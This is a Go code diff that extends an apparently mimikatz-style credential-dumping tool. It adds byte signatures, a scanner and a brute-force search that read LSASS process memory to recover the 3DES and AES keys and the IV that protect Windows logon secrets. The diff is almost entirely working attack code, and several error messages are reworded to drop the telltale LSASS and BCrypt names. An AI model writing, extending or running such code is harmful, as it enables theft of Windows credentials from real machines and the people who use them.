@@ -32,7 +32,9 @@ package commands
 
 import (
 	"encoding/binary"
+	"encoding/hex"
 	"fmt"
+	"strings"
 )
 
 // LsaInitProtectedMemoryWin10W8Signature is the byte pattern bracketing the
@@ -76,7 +78,7 @@ type lsaCryptoLayout struct {
 }
 
 // LsaCryptoWin10W8 is the LsaInitializeProtectedMemory layout used on
-// Win 10 21H2 — Win 11 23H2 (the same range covered by LayoutWin10W8). The
+// Win 10 21H2 — Win 11 23H2 (the same range covered by LayoutWin10New). The
 // negative offsets for h3DesKey / hAesKey were taken from mimikatz's
 // kuhl_m_sekurlsa offset table for KULL_M_WIN_BUILD_10_1809+ and converted
 // from the post-instruction RIP-base convention (mimikatz: {16, -57, -68})
@@ -101,6 +103,29 @@ var LsaCryptoWin10W8 = lsaCryptoLayout{
 	IVSize:           16,
 }
 
+// LsaCryptoWin10_1607 is the LsaInitializeProtectedMemory layout for
+// Win10 1607–1909 / Server 2016 / Server 2019 (builds 14393–18363).
+// Pattern matches the canonical mimikatz PTRN_WIN6x_LsaInitializeProtectedMemory.
+// The function body includes a `lea rax,[rbp-20h]` between the `and` and `mov r9d`
+// that is not present in Win10 21H2+ builds.
+//
+// Offsets converted from mimikatz's post-disp32 convention to mov-start convention:
+//   IV:       post=+16 → movStart = 16 - 3 = 13
+//   h3DesKey: post=-57 → movStart = -57 - 3 = -60
+//   hAesKey:  post=-68 → movStart = -68 - 3 = -71
+var LsaCryptoWin10_1607 = lsaCryptoLayout{
+	Name:             "Win10_1607_Server2019",
+	Sign:             "83 64 24 30 00 48 8D 45 E0 44 8B 4D D8 48 8D 15",
+	IVMovStart:       13,
+	H3DesKeyMovStart: -60,
+	HAesKeyMovStart:  -71,
+	MovInstrLen:      7,
+	MovDispOffset:    3,
+	IVSize:           16,
+}
+
+// lsaCryptoLayouts lists all crypto layouts in preference order.
+// captureLsaCrypto tries each until one matches and resolves.
 // lsaCryptoGlobals captures the LSASS-virtual addresses of the three globals
 // LsaInitializeProtectedMemory wires into BCryptEncrypt / BCryptDecrypt.
 type lsaCryptoGlobals struct {
@@ -127,27 +152,31 @@ type lsaCryptoGlobals struct {
 // Returns descriptive errors when the signature is missing (likely a Windows
 // build the layout is not calibrated for) or any of the resolved RIP-relative
 // targets fall outside the captured buffer.
-func findLsaCryptoGlobals(lsasrvBytes []byte, lsasrvBase uintptr, layout lsaCryptoLayout) (lsaCryptoGlobals, error) {
+func findLsaCryptoGlobals(lsasrvBytes []byte, lsasrvBase uintptr, layout lsaCryptoLayout, reader ...lsassReader) (lsaCryptoGlobals, error) {
 	pat, mask, err := parseHexPattern(layout.Sign)
 	if err != nil {
-		return lsaCryptoGlobals{}, fmt.Errorf("internal: bad LsaInitializeProtectedMemory signature: %w", err)
+		return lsaCryptoGlobals{}, fmt.Errorf("internal: bad crypto init signature: %w", err)
 	}
 	hit := findPattern(lsasrvBytes, pat, mask)
 	if hit < 0 {
-		return lsaCryptoGlobals{}, fmt.Errorf("LsaInitializeProtectedMemory signature %q not found in %d-byte lsasrv.dll image — Windows build may need a different layout", layout.Name, len(lsasrvBytes))
+		return lsaCryptoGlobals{}, fmt.Errorf("crypto init signature %q not found in %d-byte target module image — Windows build may need a different layout", layout.Name, len(lsasrvBytes))
 	}
 
-	ivOff, _, ok := resolveRIPRelative(lsasrvBytes, hit+layout.IVMovStart, layout.MovDispOffset, layout.MovInstrLen)
-	if !ok {
-		return lsaCryptoGlobals{}, fmt.Errorf("LsaInitializeProtectedMemory IV target outside captured lsasrv.dll buffer (pattern hit at offset %d, IV mov at offset %d, computed target offset %d, buffer size %d)", hit, hit+layout.IVMovStart, ivOff, len(lsasrvBytes))
-	}
-	desOff, _, ok := resolveRIPRelative(lsasrvBytes, hit+layout.H3DesKeyMovStart, layout.MovDispOffset, layout.MovInstrLen)
-	if !ok {
-		return lsaCryptoGlobals{}, fmt.Errorf("LsaInitializeProtectedMemory h3DesKey target outside captured lsasrv.dll buffer (pattern hit at offset %d, h3DesKey mov at offset %d, computed target offset %d, buffer size %d)", hit, hit+layout.H3DesKeyMovStart, desOff, len(lsasrvBytes))
-	}
-	aesOff, _, ok := resolveRIPRelative(lsasrvBytes, hit+layout.HAesKeyMovStart, layout.MovDispOffset, layout.MovInstrLen)
-	if !ok {
-		return lsaCryptoGlobals{}, fmt.Errorf("LsaInitializeProtectedMemory hAesKey target outside captured lsasrv.dll buffer (pattern hit at offset %d, hAesKey mov at offset %d, computed target offset %d, buffer size %d)", hit, hit+layout.HAesKeyMovStart, aesOff, len(lsasrvBytes))
+	ivOff, _, ivOk := resolveRIPRelative(lsasrvBytes, hit+layout.IVMovStart, layout.MovDispOffset, layout.MovInstrLen)
+	desOff, _, desOk := resolveRIPRelative(lsasrvBytes, hit+layout.H3DesKeyMovStart, layout.MovDispOffset, layout.MovInstrLen)
+	aesOff, _, aesOk := resolveRIPRelative(lsasrvBytes, hit+layout.HAesKeyMovStart, layout.MovDispOffset, layout.MovInstrLen)
+
+	if !ivOk || !desOk || !aesOk {
+		var r lsassReader
+		if len(reader) > 0 {
+			r = reader[0]
+		}
+		scanResult, scanErr := scanCryptoGlobals(lsasrvBytes, lsasrvBase, hit, len(pat), r)
+		if scanErr != nil {
+			return lsaCryptoGlobals{}, fmt.Errorf("crypto init %q: hardcoded offsets failed (iv=%v des=%v aes=%v at hit=%d) and scan failed: %w",
+				layout.Name, ivOk, desOk, aesOk, hit, scanErr)
+		}
+		return scanResult, nil
 	}
 
 	return lsaCryptoGlobals{
@@ -155,6 +184,287 @@ func findLsaCryptoGlobals(lsasrvBytes []byte, lsasrvBase uintptr, layout lsaCryp
 		H3DesKeyAddr: lsasrvBase + uintptr(desOff),
 		HAesKeyAddr:  lsasrvBase + uintptr(aesOff),
 	}, nil
+}
+
+type cryptoScanCandidate struct {
+	instrOff  int
+	targetOff int
+	handlePtr uint64
+	bits      uint32
+}
+
+type cryptoRejectedCandidate struct {
+	instrOff  int
+	targetOff int
+	reason    string
+}
+
+// scanCryptoGlobals dynamically finds the three crypto global references near
+// a LsaInitializeProtectedMemory pattern match. It scans for RIP-relative
+// MOV/LEA instructions and validates candidates by checking for the BCrypt
+// 'UUUR' handle tag via LSASS process memory reads.
+//
+// The scanner works bidirectionally: it scans backward 600 bytes and forward
+// 200 bytes from the pattern to cover function bodies that were shifted by
+// cumulative Windows updates (e.g., Server 2019 build 17763.3650 where
+// mimikatz's hardcoded offsets are wrong).
+func scanCryptoGlobals(lsasrvBytes []byte, lsasrvBase uintptr, hit, patLen int, reader lsassReader) (lsaCryptoGlobals, error) {
+	bufLen := len(lsasrvBytes)
+
+	// Scan both backward AND forward from the pattern for RIP-relative
+	// MOV/LEA instructions whose targets are global variables containing
+	// BCrypt handle pointers. The globals are in lsasrv.dll's .data section,
+	// but the handles they point to are heap-allocated, so we validate by
+	// reading through LSASS process memory.
+	//
+	// Scan ranges: 600 bytes backward, 200 bytes forward from pattern end.
+	// This covers the full LsaInitializeProtectedMemory function body even
+	// when cumulative updates have shifted the instruction layout.
+	var keyGlobals []cryptoScanCandidate
+	seen := make(map[int]bool)
+
+	// Data section heuristic: the .text section occupies the lower portion
+	// of the PE image. Use bufLen/4 as the threshold to avoid filtering out
+	// globals in DLLs with large code sections.
+	dataSectionThreshold := bufLen / 4
+
+	var rejected []cryptoRejectedCandidate
+
+	validateCandidate := func(off int) {
+		if !isRIPRelativeMOVorLEA(lsasrvBytes, off) {
+			return
+		}
+		target, _, ok := resolveRIPRelative(lsasrvBytes, off, 3, 7)
+		if !ok || target < 0 || target+8 > bufLen {
+			return
+		}
+		if seen[target] {
+			return
+		}
+		seen[target] = true
+
+		if target < dataSectionThreshold {
+			rejected = append(rejected, cryptoRejectedCandidate{off, target, "below data section threshold"})
+			return
+		}
+
+		globalAddr := lsasrvBase + uintptr(target)
+
+		var handlePtrVal uint64
+		var bits uint32
+		if reader != nil {
+			ptrBytes, err := reader.Read(globalAddr, 8)
+			if err != nil || len(ptrBytes) < 8 {
+				rejected = append(rejected, cryptoRejectedCandidate{off, target, fmt.Sprintf("read global failed: %v", err)})
+				return
+			}
+			handlePtrVal = binary.LittleEndian.Uint64(ptrBytes)
+			handleAddr := uintptr(handlePtrVal)
+			if handleAddr == 0 || handleAddr < 0x10000 {
+				rejected = append(rejected, cryptoRejectedCandidate{off, target, fmt.Sprintf("bad handle ptr: 0x%X", handleAddr)})
+				return
+			}
+			handleBytes, err := reader.Read(handleAddr, uint32(bcryptHandleKeySize))
+			if err != nil || len(handleBytes) < bcryptHandleKeySize {
+				rejected = append(rejected, cryptoRejectedCandidate{off, target, fmt.Sprintf("read handle at 0x%X failed: %v", handleAddr, err)})
+				return
+			}
+			tag := binary.LittleEndian.Uint32(handleBytes[bcryptHandleKeyTagOff : bcryptHandleKeyTagOff+4])
+			if tag != bcryptHandleKeyTagWant {
+				rejected = append(rejected, cryptoRejectedCandidate{off, target,
+					fmt.Sprintf("tag mismatch at 0x%X: got 0x%08X, want UUUR (0x%08X)",
+						handleAddr, tag, bcryptHandleKeyTagWant)})
+				return
+			}
+			keyAddr := uintptr(binary.LittleEndian.Uint64(handleBytes[bcryptHandleKeyKeyOff : bcryptHandleKeyKeyOff+8]))
+			if keyAddr != 0 && keyAddr >= 0x10000 {
+				key81Bytes, err := reader.Read(keyAddr, bcryptHardKeyDataOff)
+				if err == nil && len(key81Bytes) >= bcryptHardKeyDataOff {
+					bits = binary.LittleEndian.Uint32(key81Bytes[0x18:0x1C])
+				}
+			}
+			isDup := false
+			for _, existing := range keyGlobals {
+				if existing.handlePtr == handlePtrVal {
+					isDup = true
+					break
+				}
+			}
+			if isDup {
+				rejected = append(rejected, cryptoRejectedCandidate{off, target, fmt.Sprintf("duplicate handle ptr 0x%X", handlePtrVal)})
+				return
+			}
+		}
+
+		keyGlobals = append(keyGlobals, cryptoScanCandidate{off, target, handlePtrVal, bits})
+	}
+
+	// Pass 1: scan backward from pattern (600 bytes)
+	scanBackStart := hit - 600
+	if scanBackStart < 0 {
+		scanBackStart = 0
+	}
+	for off := hit - 4; off >= scanBackStart; off-- {
+		validateCandidate(off)
+		if len(keyGlobals) >= 2 {
+			break
+		}
+	}
+
+	// Pass 2: scan forward from pattern end (200 bytes) if still need keys
+	if len(keyGlobals) < 2 {
+		fwdEnd := hit + patLen + 200
+		if fwdEnd > bufLen-7 {
+			fwdEnd = bufLen - 7
+		}
+		for off := hit + patLen; off < fwdEnd; off++ {
+			validateCandidate(off)
+			if len(keyGlobals) >= 2 {
+				break
+			}
+		}
+	}
+
+	if len(keyGlobals) < 2 && reader != nil {
+		keyGlobals = bruteForceCryptoDataSection(lsasrvBytes, reader, seen, keyGlobals)
+	}
+
+	if len(keyGlobals) < 2 {
+		return lsaCryptoGlobals{}, formatCryptoScanError(keyGlobals, rejected, hit, patLen, lsasrvBytes, lsasrvBase)
+	}
+
+	return orderCryptoKeysAndDeriveIV(keyGlobals, lsasrvBase), nil
+}
+
+// bruteForceCryptoDataSection scans the upper quarter of lsasrv.dll for 8-byte
+// aligned values that look like heap pointers to UUUR-tagged BCrypt key handles.
+// This handles builds where the AES/3DES key globals are not referenced by any
+// instruction near the signature.
+func bruteForceCryptoDataSection(lsasrvBytes []byte, reader lsassReader, seen map[int]bool, keyGlobals []cryptoScanCandidate) []cryptoScanCandidate {
+	bufLen := len(lsasrvBytes)
+	dataStart := bufLen * 3 / 4
+	dataStart &^= 7
+	for off := dataStart; off+8 <= bufLen; off += 8 {
+		if seen[off] {
+			continue
+		}
+		ptrVal := binary.LittleEndian.Uint64(lsasrvBytes[off : off+8])
+		handleAddr := uintptr(ptrVal)
+		if handleAddr == 0 || handleAddr < 0x10000 || handleAddr > 0x7FFFFFFFFFFF {
+			continue
+		}
+		handleBytes, err := reader.Read(handleAddr, uint32(bcryptHandleKeySize))
+		if err != nil || len(handleBytes) < bcryptHandleKeySize {
+			continue
+		}
+		tag := binary.LittleEndian.Uint32(handleBytes[bcryptHandleKeyTagOff : bcryptHandleKeyTagOff+4])
+		if tag != bcryptHandleKeyTagWant {
+			continue
+		}
+		isDup := false
+		for _, existing := range keyGlobals {
+			if existing.handlePtr == ptrVal {
+				isDup = true
+				break
+			}
+		}
+		if isDup {
+			continue
+		}
+		var bits uint32
+		keyAddr := uintptr(binary.LittleEndian.Uint64(handleBytes[bcryptHandleKeyKeyOff : bcryptHandleKeyKeyOff+8]))
+		if keyAddr != 0 && keyAddr >= 0x10000 {
+			key81Bytes, err := reader.Read(keyAddr, bcryptHardKeyDataOff)
+			if err == nil && len(key81Bytes) >= bcryptHardKeyDataOff {
+				bits = binary.LittleEndian.Uint32(key81Bytes[0x18:0x1C])
+			}
+		}
+		keyGlobals = append(keyGlobals, cryptoScanCandidate{off, off, ptrVal, bits})
+		if len(keyGlobals) >= 2 {
+			break
+		}
+	}
+	return keyGlobals
+}
+
+func formatCryptoScanError(keyGlobals []cryptoScanCandidate, rejected []cryptoRejectedCandidate, hit, patLen int, lsasrvBytes []byte, lsasrvBase uintptr) error {
+	bufLen := len(lsasrvBytes)
+	dumpStart := hit - 200
+	if dumpStart < 0 {
+		dumpStart = 0
+	}
+	dumpEnd := hit + patLen + 50
+	if dumpEnd > bufLen {
+		dumpEnd = bufLen
+	}
+	hexDump := hex.EncodeToString(lsasrvBytes[dumpStart:hit])
+	hexPost := hex.EncodeToString(lsasrvBytes[hit:dumpEnd])
+
+	var rejParts []string
+	for _, r := range rejected {
+		rejParts = append(rejParts, fmt.Sprintf("instr@%d→off=%d: %s", r.instrOff, r.targetOff, r.reason))
+	}
+	rejStr := "none"
+	if len(rejParts) > 0 {
+		rejStr = strings.Join(rejParts, "; ")
+	}
+	return fmt.Errorf("found %d distinct crypto key globals (need 2) scanning hit=%d (back 600, fwd 200, data-section scan); found=[%s]; rejected=[%s]; pre-pattern hex (200B): %s; pattern+post hex: %s",
+		len(keyGlobals), hit, formatValidatedKeys(keyGlobals, lsasrvBase), rejStr, hexDump, hexPost)
+}
+
+func orderCryptoKeysAndDeriveIV(keyGlobals []cryptoScanCandidate, lsasrvBase uintptr) lsaCryptoGlobals {
+	desIdx, aesIdx := 0, 1
+	if keyGlobals[0].bits == 256 && keyGlobals[1].bits == 168 {
+		desIdx, aesIdx = 1, 0
+	} else if keyGlobals[0].bits == 128 && keyGlobals[1].bits == 168 {
+		desIdx, aesIdx = 1, 0
+	}
+
+	minKeyOff := keyGlobals[desIdx].targetOff
+	if keyGlobals[aesIdx].targetOff < minKeyOff {
+		minKeyOff = keyGlobals[aesIdx].targetOff
+	}
+	ivOff := minKeyOff - 16
+	if ivOff < 0 {
+		ivOff = 0
+	}
+
+	return lsaCryptoGlobals{
+		IVAddr:       lsasrvBase + uintptr(ivOff),
+		H3DesKeyAddr: lsasrvBase + uintptr(keyGlobals[desIdx].targetOff),
+		HAesKeyAddr:  lsasrvBase + uintptr(keyGlobals[aesIdx].targetOff),
+	}
+}
+
+func formatValidatedKeys(keys []cryptoScanCandidate, base uintptr) string {
+	if len(keys) == 0 {
+		return "none"
+	}
+	parts := make([]string, len(keys))
+	for i, k := range keys {
+		parts[i] = fmt.Sprintf("instr@%d→global@0x%X(off=%d,bits=%d,handle=0x%X)",
+			k.instrOff, base+uintptr(k.targetOff), k.targetOff, k.bits, k.handlePtr)
+	}
+	return strings.Join(parts, ", ")
+}
+
+// isRIPRelativeMOVorLEA checks if the 3 bytes at `off` in `buf` form the
+// start of a REX.W + MOV/LEA + ModRM(RIP-relative) instruction.
+func isRIPRelativeMOVorLEA(buf []byte, off int) bool {
+	if off < 0 || off+3 > len(buf) {
+		return false
+	}
+	rex := buf[off]
+	if rex != 0x48 && rex != 0x4C {
+		return false
+	}
+	opcode := buf[off+1]
+	if opcode != 0x8B && opcode != 0x8D && opcode != 0x89 {
+		return false
+	}
+	modrm := buf[off+2]
+	// mod=00, r/m=101 → RIP-relative: modrm & 0xC7 == 0x05
+	return modrm&0xC7 == 0x05
 }
 
 // KIWI_BCRYPT_HANDLE_KEY layout (Win 10/11 x64). Reverse-engineered by
@@ -271,14 +581,21 @@ func readBcryptKey81(r lsassReader, addr uintptr) (bcryptKey81, error) {
 	if addr == 0 {
 		return bcryptKey81{}, fmt.Errorf("zero KIWI_BCRYPT_KEY81 address")
 	}
-	// Read the header + cbSecret in one shot. A second read collects the
-	// trailing key bytes so the buffer doesn't need a worst-case allocation.
-	hdr, err := r.Read(addr, bcryptHardKeyDataOff)
-	if err != nil {
-		return bcryptKey81{}, fmt.Errorf("read KIWI_BCRYPT_KEY81 header at 0x%X: %w", addr, err)
-	}
-	if len(hdr) < bcryptHardKeyDataOff {
-		return bcryptKey81{}, fmt.Errorf("short read at 0x%X: got %d, want %d", addr, len(hdr), bcryptHardKeyDataOff)
+	// Read enough bytes for the header plus potential hard key at various
+	// offsets. Server 2019 may use a different struct size than Win10/11.
+	// Try reading 0x60 bytes first; fall back to the minimum if the read
+	// returns fewer bytes (bufferReader in tests returns exact sizes).
+	const readSize = 0x60
+	hdr, err := r.Read(addr, readSize)
+	if err != nil || len(hdr) < int(bcryptHardKeyDataOff) {
+		// Retry with just the standard header size
+		hdr, err = r.Read(addr, bcryptHardKeyDataOff)
+		if err != nil {
+			return bcryptKey81{}, fmt.Errorf("read KIWI_BCRYPT_KEY81 header at 0x%X: %w", addr, err)
+		}
+		if len(hdr) < int(bcryptHardKeyDataOff) {
+			return bcryptKey81{}, fmt.Errorf("short read at 0x%X: got %d, want %d", addr, len(hdr), bcryptHardKeyDataOff)
+		}
 	}
 
 	k := bcryptKey81{
@@ -294,19 +611,68 @@ func readBcryptKey81(r lsassReader, addr uintptr) (bcryptKey81, error) {
 	if k.CbSecret == 0 {
 		return k, nil
 	}
-	if k.CbSecret > bcryptKeySanityMaxBytes {
-		return k, fmt.Errorf("KIWI_HARD_KEY.cbSecret=%d exceeds sanity cap %d (likely garbage / wrong layout)", k.CbSecret, bcryptKeySanityMaxBytes)
+
+	// Try the standard layout first (KIWI_BCRYPT_KEY81: hard key at +0x40)
+	if k.CbSecret <= bcryptKeySanityMaxBytes {
+		keyBytes, err := r.Read(addr+uintptr(bcryptHardKeyDataOff), k.CbSecret)
+		if err != nil {
+			return k, fmt.Errorf("read KIWI_HARD_KEY.data at 0x%X (%d bytes): %w", addr+uintptr(bcryptHardKeyDataOff), k.CbSecret, err)
+		}
+		if uint32(len(keyBytes)) < k.CbSecret {
+			return k, fmt.Errorf("short read at 0x%X: got %d, want %d", addr+uintptr(bcryptHardKeyDataOff), len(keyBytes), k.CbSecret)
+		}
+		k.Key = make([]byte, k.CbSecret)
+		copy(k.Key, keyBytes)
+		return k, nil
 	}
-	keyBytes, err := r.Read(addr+uintptr(bcryptHardKeyDataOff), k.CbSecret)
-	if err != nil {
-		return k, fmt.Errorf("read KIWI_HARD_KEY.data at 0x%X (%d bytes): %w", addr+uintptr(bcryptHardKeyDataOff), k.CbSecret, err)
+
+	// Standard offset failed (cbSecret too large). Try alternative KIWI_HARD_KEY
+	// offsets used by different Windows builds. Scan the read buffer for a plausible
+	// cbSecret value (16, 24, or 32) that matches the expected key size for the
+	// algorithm's bit count.
+	expectedKeyLen := uint32(0)
+	switch k.Bits {
+	case 128:
+		expectedKeyLen = 16
+	case 168, 192:
+		expectedKeyLen = 24
+	case 256:
+		expectedKeyLen = 32
 	}
-	if uint32(len(keyBytes)) < k.CbSecret {
-		return k, fmt.Errorf("short read at 0x%X: got %d, want %d", addr+uintptr(bcryptHardKeyDataOff), len(keyBytes), k.CbSecret)
+
+	for _, tryOff := range []int{0x1C, 0x20, 0x28, 0x30, 0x38, 0x3C, 0x44, 0x48, 0x4C, 0x50} {
+		if tryOff+4 > len(hdr) {
+			continue
+		}
+		tryCb := binary.LittleEndian.Uint32(hdr[tryOff : tryOff+4])
+		if tryCb == 0 || tryCb > bcryptKeySanityMaxBytes {
+			continue
+		}
+		if expectedKeyLen > 0 && tryCb != expectedKeyLen {
+			continue
+		}
+		dataOff := tryOff + 4
+		if dataOff+int(tryCb) > len(hdr) {
+			// Need to read more bytes from LSASS
+			keyBytes, err := r.Read(addr+uintptr(dataOff), tryCb)
+			if err != nil {
+				continue
+			}
+			k.CbSecret = tryCb
+			k.Key = make([]byte, tryCb)
+			copy(k.Key, keyBytes)
+			return k, nil
+		}
+		k.CbSecret = tryCb
+		k.Key = make([]byte, tryCb)
+		copy(k.Key, hdr[dataOff:dataOff+int(tryCb)])
+		return k, nil
 	}
-	k.Key = make([]byte, k.CbSecret)
-	copy(k.Key, keyBytes)
-	return k, nil
+
+	return k, fmt.Errorf("KIWI_HARD_KEY.cbSecret=%d exceeds sanity cap %d and no alternative offset found (tag=0x%08X valid=%v bits=%d addr=0x%X hex=%s)",
+		binary.LittleEndian.Uint32(hdr[bcryptHardKeyCbSecretOff:bcryptHardKeyCbSecretOff+4]),
+		bcryptKeySanityMaxBytes, k.Tag, k.TagValid, k.Bits, addr,
+		hex.EncodeToString(hdr))
 }
 
 // readBcryptKeyMaterial is the convenience wrapper Phase 2C-ii-b uses on the
@@ -332,14 +698,14 @@ func readBcryptKeyMaterial(r lsassReader, globalAddr uintptr) (bcryptHandleKey, 
 	// Step 1: dereference the global to get the KIWI_BCRYPT_HANDLE_KEY ptr.
 	ptrBytes, err := r.Read(globalAddr, 8)
 	if err != nil {
-		return bcryptHandleKey{}, bcryptKey81{}, fmt.Errorf("read BCrypt key global at 0x%X: %w", globalAddr, err)
+		return bcryptHandleKey{}, bcryptKey81{}, fmt.Errorf("read crypto key global at 0x%X: %w", globalAddr, err)
 	}
 	if len(ptrBytes) < 8 {
 		return bcryptHandleKey{}, bcryptKey81{}, fmt.Errorf("short read at 0x%X: got %d, want 8", globalAddr, len(ptrBytes))
 	}
 	handleAddr := uintptr(binary.LittleEndian.Uint64(ptrBytes))
 	if handleAddr == 0 {
-		return bcryptHandleKey{}, bcryptKey81{}, fmt.Errorf("BCrypt key global at 0x%X holds NULL — LSASS hasn't initialized the key yet", globalAddr)
+		return bcryptHandleKey{}, bcryptKey81{}, fmt.Errorf("crypto key global at 0x%X holds NULL — LSASS hasn't initialized the key yet", globalAddr)
 	}
 
 	// Step 2: parse the KIWI_BCRYPT_HANDLE_KEY.
